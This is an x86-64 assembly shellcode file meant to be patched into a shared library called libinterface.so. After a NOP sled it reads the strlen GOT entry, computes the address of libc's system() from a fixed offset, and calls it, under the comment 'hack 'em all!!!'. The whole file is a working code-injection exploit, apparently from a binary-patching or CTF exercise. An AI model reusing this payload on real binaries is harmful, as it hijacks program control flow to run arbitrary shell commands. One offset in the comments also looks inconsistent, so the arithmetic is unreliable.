[SECTION .text]
global _start
_start:
		nop									; c54 GetUnit
 		nop									; fill with NOPs, so actual shell start with aligned adress - c60
 		nop
 		nop
 		nop
 		nop
 		nop
 		nop
 		nop
 		nop
 		nop
 		nop
		sub rsp, 0x10 						; c60
		push rbx

		; launch objdump -d -M intel libinterface.so and find this lines:
		; 00000000000008e0 <strlen@plt>:
 		;  8e0:   ff 25 4a 17 20 00       jmp    QWORD PTR [rip+0x20174a]        # 202030 <strlen@GLIBC_2.2.5>
		; 
		; so to get 0x2013cb in 'mov' instruction below:
		; 8e0 - c65 + 201741a + 6
		; where c65 - is start address of 'mov' instruction, 6 - number of bytes in 'jmp' instruction

		; load to rbx address of 'strlen' function
 		mov rbx, [rel $ + 0x2013cb]			; c65
 		; calculate address of 'system' function
 		sub rbx, 0x13F150 					; &strlen - &system = 0x13F150
 		; hack 'em all!!!
 		call rbx
 		pop rbx
 		add rsp, 0x10
 		ret